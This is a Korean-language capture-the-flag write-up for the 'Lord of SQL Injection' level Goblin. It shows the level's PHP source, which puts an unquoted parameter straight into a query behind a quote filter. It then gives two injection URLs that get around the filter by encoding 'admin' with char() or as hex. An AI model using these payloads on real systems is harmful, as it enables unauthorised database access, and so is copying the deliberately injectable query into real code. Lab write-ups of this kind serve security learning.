# Lord of SQL Injection No.3 Goblin

LOS Goblin 문제는 `'`,`"`를 사용하지 않고 SQL 공격을 할 수 있도록 유도한 문제이다.

### 소스 코드

goblin 문제의 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

#### 문제 해결 조건
```sql
select id from prob_goblin where id='guest' and no={$_GET[no]}
```
위의 SQL문에서 id값을 admin으로 조작하면 문제 풀이에 성공하게 된다.

주의할 점으로는
```php
...
    if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");
...
```
위의 if문에서 `'`, `"`, ``` ` ``` 를 `preg_match`로 사용을 제한했기 때문에 이 기호들을 사용하지 않고 SQL문을 조작할 수 있어야한다.

## Solution

```
http://los.eagle-jump.org/goblin_***.php?no=-1 or id=char(97,100,109,105,110) -- ;
```
URL에 `char` 함수를 통해 ASCII를 이용하여 기호 사용없이 `admin` 이라는 문자열을 삽입하여 문제를 해결할 수 있다.

```
http://los.eagle-jump.org/goblin_***.php?no=-1 or id=0x61646d696e -- ;
```

URL에 ASCII를 삽입하여 문제를 해결하는 방법 외에도 Hex 값을 삽입하여 `admin` SQL문을 조작할 수 있다.

#### Hex
* `admin`을 Hex로 전환하여 삽입을 하기 위해서는 반드시 앞에 `0x`를 붙여주어야 한다.

* [코드 변환 사이트](https://paulschou.com/tools/xlate/)